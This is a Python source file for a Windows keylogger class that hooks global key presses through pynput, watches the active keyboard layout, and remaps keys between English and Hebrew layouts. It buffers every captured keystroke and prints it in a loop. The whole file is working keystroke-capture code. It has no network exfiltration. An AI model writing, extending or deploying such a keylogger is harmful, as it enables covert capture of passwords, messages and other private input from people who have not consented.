import threading
import logging
import ctypes
import locale
from datetime import datetime
from pynput import keyboard
import win32gui, win32process, win32api

LANGUAGE_MAP = {
    "en-US": "English",
    "he_IL": "Hebrew"
}


class KeyloggerService:
    def __init__(self):
        self._buffer = []
        self._lock = threading.Lock()
        self._is_saving = False
        self._listener = None
        self._current_language = self._get_current_language()
        logging.basicConfig(level=logging.ERROR, format='%(asctime)s [%(levelname)s] %(message)s')

        self._listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        self._listener.start()

    def start_logging(self):
        self._is_saving = True

    def stop_logging(self):
        self._is_saving = False

    def stop_service(self):
        self._is_saving = False
        if self._listener:
            self._listener.stop()
            self._listener.join()
            self._listener = None

    def on_press(self, key):
        if not self._is_saving:
            return

        new_lang = self._get_current_language()
        if new_lang != self._current_language:
            with self._lock:
                self._buffer.append(f"[LANGUAGE_CHANGED: {new_lang}]")
            self._current_language = new_lang

        with self._lock:
            try:
                formatted_key = self._format_key(key.char)
                if formatted_key:
                    self._buffer.append(formatted_key)
            except AttributeError:
                self._handle_special_keys(key)

    def on_release(self, key):
        pass

    def get_buffer_data(self):
        with self._lock:
            data = "".join(self._buffer)
            self._buffer.clear()
        return data

    def _get_current_language(self):
        try:
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            hwnd = user32.GetForegroundWindow()
            if hwnd == 0:
                thread_id = ctypes.windll.kernel32.GetCurrentThreadId()
            else:
                thread_id = user32.GetWindowThreadProcessId(hwnd, None)

            if not thread_id:
                return "en-US"

            hkl = user32.GetKeyboardLayout(thread_id)
            if not hkl:
                return "en-US"

            language_id = hkl & 0xFFFF
            return locale.windows_locale.get(language_id, "en-US")
        except Exception:
            return "en-US"

    def _handle_special_keys(self, key):
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
        }
        if key in special_keys:
            self._buffer.append(special_keys[key])
        elif key == keyboard.Key.backspace and self._buffer:
            self._buffer.pop()
        else:
            self._buffer.append(f"[{key}]")

    def _format_key(self, key):
        en_keyboard = "qwertyuiopasdfghjkl;'zxcvbnm,./"
        he_keyboard = "/'קראטוןםפשדגכעיחלךף,זסבהנמצתץ."

        key_lang = self._get_key_language(key)
        current_lang = self._get_current_language()

        if key_lang == current_lang:
            return key

        try:
            if key_lang == 'en-US':
                index = en_keyboard.index(key)
                return he_keyboard[index]
            elif key_lang == 'he_IL':
                index = he_keyboard.index(key)
                return en_keyboard[index]
        except ValueError:
            return key

    def _get_key_language(self, key):
        if '\u0590' <= key <= '\u05FF':
            return "he_IL"
        return "en-US"


if __name__ == "__main__":
    keylogger = KeyloggerService()
    keylogger.start_logging()
    try:
        while True:
            data = keylogger.get_buffer_data()
            if data:
                print(f"Captured: {data}")
    except KeyboardInterrupt:
        keylogger.stop_service()
